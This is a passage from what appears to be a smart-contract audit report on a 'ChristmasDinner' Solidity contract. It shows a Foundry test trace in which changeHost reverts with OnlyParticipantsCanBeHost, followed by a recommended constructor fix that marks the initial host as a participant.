    │   └─ ← [Return] 
    ├─ [0] VM::startPrank(user1: [0x29E3b139f4393aDda86303fcdAa35F60Bb7092bF])
    │   └─ ← [Return] 
    ├─ [0] VM::expectRevert(OnlyParticipantsCanBeHost())
    │   └─ ← [Return] 
    ├─ [2738] ChristmasDinner::changeHost(deployer: [0xaE0bDc4eEAC5E950B67C6819B118761CaAF61946])
->    │   └─ ← [Revert] OnlyParticipantsCanBeHost()
    ├─ [0] VM::stopPrank()
    │   └─ ← [Return] 
    └─ ← [Stop] 

Suite result: ok. 1 passed; 0 failed; 0 skipped; finished in 3.92s (131.96µs CPU time)
```

### Recommendations
Set initial host's participant to True in constructor
```diff
constructor (address _WBTC, address _WETH, address _USDC) {
        host = msg.sender;
        i_WBTC = IERC20(_WBTC);
        whitelisted[_WBTC] = true;
        i_WETH = IERC20(_WETH);
        whitelisted[_WETH] = true;
        i_USDC = IERC20(_USDC);
        whitelisted[_USDC] = true;
+       participant[host] = true;
    }
```

